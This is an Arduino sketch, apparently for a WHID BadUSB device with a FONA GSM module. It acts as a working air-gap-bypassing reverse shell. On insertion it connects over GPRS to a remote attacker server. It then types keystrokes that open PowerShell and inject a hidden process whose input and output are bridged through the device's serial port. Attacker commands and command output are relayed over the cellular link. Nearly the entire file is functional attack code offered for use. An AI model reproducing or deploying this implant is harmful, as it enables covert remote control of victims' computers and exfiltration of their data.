#include <Keyboard.h>//library for using WHID as a keyboard

#include "Adafruit_FONA.h" //Library for controlling the fona
#define FONA_RST 4

HardwareSerial *fonaSerial = &Serial1; //The fona is wired on pins 0 and 1, it represent the serial port 1
Adafruit_FONA fona = Adafruit_FONA(FONA_RST);

void typeKey(uint8_t key) { //function typing a key  
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}



void setup()
{ 
  Keyboard.begin();
  Serial.begin(230400);// Begin debug connection with a computer listening on serial
  SerialUSB.begin (230400); // Begin connection with the target computer
  fonaSerial->begin(115200);//Initialisation transmission with FONA
  if (! fona.begin(*fonaSerial)) { // Begin transmission with FONA
    Serial.println(F("NO SIM800!"));
    while (1);
  }
  while(true){
    int i = fona.getNumSMS(); //recupération du nombre de SMS
    Serial.print(F("Number of SMS: "));
    Serial.println(i);
    if(i != -1){
      Serial.println(F("\n\rDeleting SMS...")); 
      delay(500);
      if(fona.sendCheckReply(F("AT+CMGDA=\"DEL ALL\"\r\n"), F("OK"), 100)){ //effacement des sms en mémoire 
        break;
      }
    }
    if(i==0) break;
    delay(500);
  }
  fona.sendCheckReply(F("AT+CIPMODE=1"),F("OK"),100);
 //####################################################### ENTER YOUR APN CONFIGURATION HERE!###################################
 //#                                                                                                                                 #
 //###################################################################################################################################
  fona.setGPRSNetworkSettings(F("name"), F("user"), F("password"));//APN confuguration (name, user, password)
         
  if (!fona.enableGPRS(true)) //Activating GPRS
    Serial.println(F("Failed to turn on"));
 fona.sendCheckReply(F("AT+CGATT?"),F("OK"),100);//Chack if GPRS is correctly activated
  
 fona.sendCheckReply(F("AT+CIICR"),F("OK"),100);// 

 fona.sendCheckReply(F("AT+CIFSR"),F("OK"),100);// Get ip address of the card
 
 delay(100);
 //####################################################### ENTER YOUR IP ADDRESS AND ITS PORT HERE!###################################
 //#                                                                                                                                 #
 //###################################################################################################################################
 if(!fona.sendCheckReply("AT+CIPSTART=\"TCP\",\"<IP>\",\"<PORT>\"",F("OK"),100))// connection au Serveur distant 
    while(1);
 //fona.sendCheckReply(F("AT+IFC=2,2"),F("OK"),100); 

 Keyboard.press(KEY_LEFT_GUI);// Press power key
   delay(50);
   Keyboard.press((char) 114); //Press R
   Keyboard.releaseAll();
   delay(1000);
   Keyboard.print("powershell"); // Open a powershell 
   typeKey(KEY_RETURN);
   delay(1000); // wating for the powershell to start 
   //typing payload, see revershell.ps1
   Keyboard.print("$pt = New-Object -TypeName System.Diagnostics.Process;$it = $pt.StartInfo;$it.CreateNoWindow = $true;$it.UseShellExecute = $false;$it.RedirectStandardInput = $true;$it.RedirectStandardOutput = $true;$it.RedirectStandardError = $true;$it.FileName = \"powershell.exe\";$null = $pt.Start();$ct=$pt.StandardInput;$st=$pt.StandardOutput;"); 
   Keyboard.print(F("$ct.WriteLine(\" `$c=(gwmi Win32_SerialPort|Where-Object{`$_.PNPDeviceID -match `\"ID_2341&PID_804D`\"}).DeviceID;"));
   Keyboard.print(F("`$po=new-Object System.IO.Ports.SerialPort `$c,230400,None,8,one;`$po.open();"));
   //typeKey(KEY_RETURN);
  Keyboard.print("`$p = New-Object -TypeName System.Diagnostics.Process;`$i = `$p.StartInfo;`$i.CreateNoWindow = `$true;`$i.UseShellExecute = `$false;`$i.RedirectStandardInput = `$true;`$i.RedirectStandardOutput = `$true;`$i.RedirectStandardError = `$true;`$i.FileName = `\"powershell.exe`\";`$null = `$p.Start();`$c=`$p.StandardInput;`$s=`$p.StandardOutput;"); 
  Keyboard.print("while(1){do {`$de=[char]`$s.Read();`$po.Write(`$de);} while (`$de -ne `\">`\");`$c.WriteLine(`$po.ReadLine())}\") ");
  typeKey(KEY_RETURN);
  Keyboard.print("exit"); // close powershell 
  typeKey(KEY_RETURN);
 fonaSerial->readString();
  
}

void loop()
{
  if (fonaSerial->available()) //waiting for data incoming by the gprs connection 
   {
    
    Serial.print("reçu");
    delay( 1000);  
    String d=fonaSerial->readStringUntil('\n'); // reading data
    Serial.print(d);
    char v[d.length()];// converting string to char
    strcpy(v, d.c_str());
    SerialUSB.write(v); // sending data to the target computer
    SerialUSB.write("\n");
    

 
   }
   
   if (SerialUSB.available()) //waiting for data incomming from target serial connection 
   {
    
    
    String BypassAirGap = SerialUSB.readStringUntil('\n'); // reading data from thin connection
    Serial.print(BypassAirGap);// printing for debug data
    char p[BypassAirGap.length()];//converting string to char
    strcpy(p, BypassAirGap.c_str());
    delay (500);
    fonaSerial->write(p);//transmittiong data to the attacker through fona
    fonaSerial->write("\n");
    delay (100);
   }
}
